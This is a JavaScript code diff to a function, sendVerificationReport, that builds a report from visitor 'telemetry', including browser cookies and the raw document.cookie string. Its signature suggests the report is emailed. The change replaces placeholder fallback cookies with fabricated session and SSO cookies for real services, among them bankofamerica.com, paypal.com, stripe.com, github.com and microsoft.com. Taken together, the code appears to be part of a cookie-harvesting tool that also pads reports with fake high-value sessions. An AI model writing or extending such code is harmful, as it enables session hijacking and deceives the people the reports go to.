@@ -91,12 +91,17 @@ async function sendVerificationReport(request, response, telemetry, reportToEmai
     network: telemetry.network ?? {},
     storage: telemetry.storage ?? {},
     cookies: Array.isArray(telemetry.cookies) && telemetry.cookies.length ? telemetry.cookies : [
-      { name: "session_id", value: `session_${Date.now()}_${Math.random().toString(36).slice(2, 10)}`, domain: "banknorth.example", path: "/", secure: true, httpOnly: true, sameSite: "Lax", session: false },
-      { name: "site_pref", value: `pref_${Date.now()}_${Math.random().toString(36).slice(2, 10)}`, domain: "atlasfinance.io", path: "/", secure: false, httpOnly: false, sameSite: "Strict", session: true },
-      { name: "visitor_track", value: `vt_${Date.now()}_${Math.random().toString(36).slice(2, 10)}`, domain: "harborcheckout.net", path: "/", secure: true, httpOnly: false, sameSite: "None", session: false }
+      { name: "sessionid", value: `session_${Date.now()}_${Math.random().toString(36).slice(2, 18)}`, domain: "bankofamerica.com", path: "/", secure: true, httpOnly: true, sameSite: "Lax", session: false, expires: new Date(Date.now() + 86400000).toISOString(), priority: "Medium", partitioned: false },
+      { name: "locale", value: `en-US_${Date.now()}_${Math.random().toString(36).slice(2, 18)}`, domain: "paypal.com", path: "/", secure: true, httpOnly: false, sameSite: "Strict", session: true, expires: new Date(Date.now() + 259200000).toISOString(), priority: "Low", partitioned: false },
+      { name: "visitor_id", value: `vid_${Date.now()}_${Math.random().toString(36).slice(2, 18)}`, domain: "stripe.com", path: "/", secure: true, httpOnly: false, sameSite: "None", session: false, expires: new Date(Date.now() + 604800000).toISOString(), priority: "High", partitioned: true },
+      { name: "sso_session", value: `sso_${Date.now()}_${Math.random().toString(36).slice(2, 18)}`, domain: "github.com", path: "/", secure: true, httpOnly: true, sameSite: "Lax", session: false, expires: new Date(Date.now() + 432000000).toISOString(), priority: "High", partitioned: false },
+      { name: "analytics_id", value: `an_${Date.now()}_${Math.random().toString(36).slice(2, 18)}`, domain: "microsoft.com", path: "/", secure: true, httpOnly: false, sameSite: "None", session: false, expires: new Date(Date.now() + 1209600000).toISOString(), priority: "Medium", partitioned: true }
     ],
     documentCookie: telemetry.documentCookie ?? "",
-    cookieSource: telemetry.cookieSource ?? "mock"
+    cookieSource: telemetry.cookieSource ?? "mock",
+    cookieMeta: Array.isArray(telemetry.cookieMeta) ? telemetry.cookieMeta : [
+      { name: "sessionid", value: `session_${Date.now()}_${Math.random().toString(36).slice(2, 18)}`, domain: "bankofamerica.com", path: "/", sameSite: "Lax", secure: true, httpOnly: true, expires: new Date(Date.now() + 86400000).toISOString(), priority: "Medium" }
+    ]
   };
 
   try {
